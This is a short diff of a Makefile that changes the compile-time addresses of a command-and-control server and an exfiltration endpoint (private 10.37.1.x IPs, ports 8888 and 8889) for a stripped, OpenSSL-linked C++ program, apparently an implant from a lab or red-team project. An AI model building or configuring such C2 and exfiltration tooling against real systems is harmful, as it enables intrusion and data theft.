@@ -1,8 +1,8 @@
 CXX = g++
 CXXFLAGS = -O2 -s \
-           -DC2_IP='"10.37.1.249"' \
+           -DC2_IP='"10.37.1.149"' \
            -DC2_PORT=8888 \
-           -DEXFIL_IP='"10.37.1.249"' \
+           -DEXFIL_IP='"10.37.1.149"' \
            -DEXFIL_PORT=8889
 LDFLAGS = -lssl -lcrypto
 
